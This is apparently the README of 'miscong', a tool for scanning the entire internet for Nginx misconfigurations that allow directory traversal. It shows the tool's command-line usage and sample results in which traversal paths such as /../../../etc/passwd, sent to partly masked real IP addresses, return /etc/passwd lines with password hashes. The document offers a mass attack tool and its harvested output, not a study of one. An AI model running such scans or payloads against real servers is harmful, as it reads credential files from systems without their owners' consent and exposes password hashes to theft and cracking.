# miscong

Nginx misconfig directory traversal tool over entire internet

```
usage: app.py [-h] [-w WORKERS] [-t TIMEOUT] [-l LIMIT] [-d DEBUGLEVEL] list

positional arguments:
  list

optional arguments:
  -h, --help            show this help message and exit
  -w WORKERS, --workers WORKERS
  -t TIMEOUT, --timeout TIMEOUT
  -l LIMIT, --limit LIMIT
  -d DEBUGLEVEL, --debuglevel DEBUGLEVEL
```

# Samples

```
[+] 18x.xxx.xxx.59 /../../../../../../../../../../etc/passwd
  >>> root:absxcfbgXtb3o:0:0:root:/:/bin/sh
```

```
[+] xx0.xxx.xxx.182 /../../../../../../../../../../etc/passwd
  >>> root:dBR90FNYY06dg:0:0::/root:/bin/sh
```

```
[+] 109.xxx.xxx.xx2 ../../../../../../../../../../../../etc/hosts
  >>> 127.0.0.1 localhost
```

```
[+] 109.xxx.xxx.xx2 ../../../../../../../../../../../../etc/passwd
  >>> root:$1$wbAnPk8f$yz0PI9vnyLRmWbENUnce3/:0:0::/root:/bin/sh
```
